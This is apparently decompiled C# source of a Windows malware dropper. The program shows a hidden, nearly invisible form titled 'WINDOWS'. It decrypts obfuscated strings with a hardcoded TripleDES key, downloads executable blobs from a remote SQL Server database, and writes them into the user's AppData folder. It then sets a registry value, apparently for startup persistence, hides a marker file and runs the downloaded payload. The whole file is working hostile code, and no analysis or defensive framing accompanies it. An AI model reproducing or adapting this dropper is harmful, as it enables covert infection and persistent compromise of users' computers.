using System;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ascBanxikXzuSMzEiVUtULhncmuDBmGpIKmErNIgGIcdmo.My;

namespace ascBanxikXzuSMzEiVUtULhncmuDBmGpIKmErNIgGIcdmo;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING01;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING02;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING03;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING04;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING05;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING06;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING07;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING08;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING09;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING010;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING021;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING032;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING043;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING054;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING065;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING076;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING087;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING098;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0100;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0211;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0322;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0433;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0544;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0655;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0766;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0877;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0988;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING01000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING02111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING03222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING04333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING05444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING06555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING07666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING08777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING09888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING010000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING021111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING032222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING043333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING054444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING065555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING076666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING087777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING098888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0100000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0211111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0322222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0433333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0544444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0655555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0766666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0877777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0988888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING01000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING02111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING03222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING04333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING05444444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING06555555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING07666666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING08777777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING09888888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING010000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING021111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING032222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING043333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING054444444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING065555555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING076666666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING087777777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING098888888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0100000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0211111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0322222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0433333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0544444444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0655555555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0766666666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0877777777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0988888888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING01000000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING02111111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING03222222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING04333333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING05444444444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING06555555555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING07666666666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING08777777777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING09888888888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING010000000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING021111111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING032222222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING043333333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING054444444444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING065555555555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING076666666666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING087777777777;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING098888888888;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0100000000000;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING02112111111111;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0322232222222;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0433334333333;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0544444544444;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0655555565555;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0766666667666;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0877777777877;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_STRING0988888888898;

	public string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_BANCODEDADOS;

	public SqlConnection MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_SQLConn;

	public SqlCommand MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_SQLCmd;

	public SqlConnection MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn;

	private const string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_pass = "IF HACKER = TRUE THEN _|_ END IF";

	private string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA;

	public Form1()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_BANCODEDADOS = MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript("cZzwkR8dkxugZ4F4il3NEzLKkywkP/moLgR/RZown07oEORofBOize6VKbEloBCJQGNCQgasFWnQ3ZX8gZqJno0CExyxW5EurL3DFsxo5Hzt1gmtjp9PtiRYYsx99FHF");
		MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_SQLConn = new SqlConnection();
		MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_SQLCmd = new SqlCommand();
		MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn = new SqlConnection(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_BANCODEDADOS);
		MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(2, 2);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.02);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("WINDOWS");
		((Control)this).ResumeLayout(false);
	}

	public static string MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript(string Message)
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes("IF HACKER = TRUE THEN _|_ END IF"));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		byte[] array = Convert.FromBase64String(Message);
		byte[] bytes;
		try
		{
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		}
		finally
		{
			tripleDESCryptoServiceProvider.Clear();
			mD5CryptoServiceProvider.Clear();
		}
		return uTF8Encoding.GetString(bytes);
	}

	public object MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_aleatorio(ref string num)
	{
		object result = default(object);
		try
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			Random random = new Random();
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = Conversions.ToInteger(num);
			for (int i = 1; i <= num2; i = checked(i + 1))
			{
				int startIndex = random.Next(0, 35);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			result = stringBuilder.ToString();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		if (!File.Exists(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + "2.KAYC"))
		{
			try
			{
				string num = Conversions.ToString(8);
				string text = Conversions.ToString(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_aleatorio(ref num));
				string text2 = MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA + "\\" + text + ".exe";
				string path = MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA + "\\" + MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript("0kB/5Hn4/5dGkn5ikbbNo9U0TYqe02FFISGYo9B0d8A=");
				if (MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn.get_State() == ConnectionState.Closed)
				{
					MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn.Open();
				}
				string text3 = MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript("fK/LcS9K6nG323x0/oaVoQhgz0FBm/XeXdxGzavzEjXJG5F6DzKly4chSew9LCf/AJqrcVS8l4k=");
				SqlCommand val = new SqlCommand(text3, MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn);
				byte[] array = (byte[])val.ExecuteScalar();
				if (array != null)
				{
					using FileStream fileStream = new FileStream(text2, FileMode.OpenOrCreate, FileAccess.Write);
					fileStream.Write(array, 0, array.Length);
					fileStream.Flush();
					fileStream.Close();
				}
				string text4 = MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript("fK/LcS9K6nG323x0/oaVoQhgz0FBm/XeXdxGzavzEjXJG5F6DzKly4chSew9LCf/fnW4xplCj9M=");
				SqlCommand val2 = new SqlCommand(text4, MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn);
				byte[] array2 = (byte[])val2.ExecuteScalar();
				if (array2 != null)
				{
					using FileStream fileStream2 = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
					fileStream2.Write(array2, 0, array2.Length);
					fileStream2.Flush();
					fileStream2.Close();
				}
				if (MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn.get_State() == ConnectionState.Open)
				{
					MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_conn.Close();
				}
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_decript("ZyuqdD5qGBfTkTNPpJ++V8BY6qf9rjN4y5d2tExKuJlS8pzztRNpcFFafBmBiRI6EIx1nbDse12sERVarpu9yQ=="), ((ServerComputer)MyProject.Computer).get_Name() + "2REG.KAYC", (object)text2);
				File.Create(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + "2.KAYC");
				FileSystem.SetAttr(MZlrLpjSUFltCcyLAZgzgFJcfrOrKHFDxbEEOAXRmtGZcG_APPDATA + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + "2.KAYC", (FileAttribute)2);
				Thread.Sleep(4000);
				Interaction.Shell(text2, (AppWinStyle)2, false, -1);
				ProjectData.EndApp();
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		ProjectData.EndApp();
	}
}
